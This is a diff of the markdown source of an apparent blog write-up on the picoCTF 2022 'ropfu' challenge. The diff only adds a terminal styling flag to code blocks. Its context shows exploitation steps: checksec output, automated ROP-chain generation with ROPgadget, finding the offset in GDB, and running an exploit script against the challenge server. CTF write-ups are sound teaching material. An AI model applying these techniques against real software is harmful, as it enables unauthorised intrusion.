@@ -30,7 +30,7 @@ hint:
 {% warning %}
 Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.{% endwarning %}
 
-{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' %}
+{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' terminal:true %}
 <span style="color:#F99157">$ </span>checksec vuln
 [<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/ropfu/vuln'
     Arch:     i386-32-little
@@ -74,7 +74,7 @@ The source only provides us with one vulnerable function: `gets()`. I've gone ov
 
 Although we could totally solve this the old-fashioned way (as John Hammond did in [his writeup](https://www.youtube.com/watch?v=c7wNN8qgxAA)), we can use the power of automation with a tool called [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)! Let's try using it here to **automatically** build the ROP-chain for us, which will eventually lead to a [syscall](https://en.wikipedia.org/wiki/System_call):
 
-{% ccb html:true caption:'auto rop-chain generation' url:'github.com/JonathanSalwan/ROPgadget' url_text:'github link' scrollable:true %}
+{% ccb html:true caption:'auto rop-chain generation' url:'github.com/JonathanSalwan/ROPgadget' url_text:'github link' scrollable:true terminal:true %}
 <span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary vuln --ropchain</span>
 
 ROP chain generation
@@ -108,7 +108,7 @@ ROP chain generation
 
 Oh, wow. It generated the entire script for us (unfortunately in Python2), with only a few missing bits and bobs! The only things we need to manually configure now are the offset and remote connection. Since the `checksec` mentioned that there was a canary enabled, it looks like we'll have to manually guess the offset with the `$eip`:
 
-{% ccb html:true caption:'GDB - \"GDB enhanced features\"' url:'gef.readthedocs.io/en/master' url_text:documentation %}
+{% ccb html:true caption:'GDB - \"GDB enhanced features\"' url:'gef.readthedocs.io/en/master' url_text:documentation terminal:true %}
 <span style="color:#47D4B9"><b>gef➤  </b></span>shell python3 -q
 >>> print('A'*28 + 'B'*4)
 AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
@@ -194,7 +194,7 @@ p.interactive()
 
 Let's run the script:
 
-{% ccb html:true %}
+{% ccb html:true terminal:true %}
 <span style="color:#F99157">$ </span> python2 exp.py
 <pre>python2 exp.py
 [<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 58931: Done
